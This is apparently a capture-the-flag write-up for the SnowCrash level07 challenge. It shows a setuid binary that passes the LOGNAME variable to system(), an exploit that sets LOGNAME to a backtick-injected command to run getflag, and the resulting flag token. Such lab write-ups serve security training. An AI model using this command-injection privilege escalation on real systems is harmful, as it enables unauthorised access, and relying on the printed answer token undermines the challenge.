## step 1

Logged in as `level07`. The home directory contains:

```
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```
The level07 binary is a setuid executable owned by flag07.

Using strings:

```
strings level07
```
Relevant findings:

Uses getenv("LOGNAME")

Calls /bin/echo %s with the result

Linked to system() function

Exploitation
Override LOGNAME to inject a shell command:
```
export LOGNAME='`getflag`' 
./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h

```

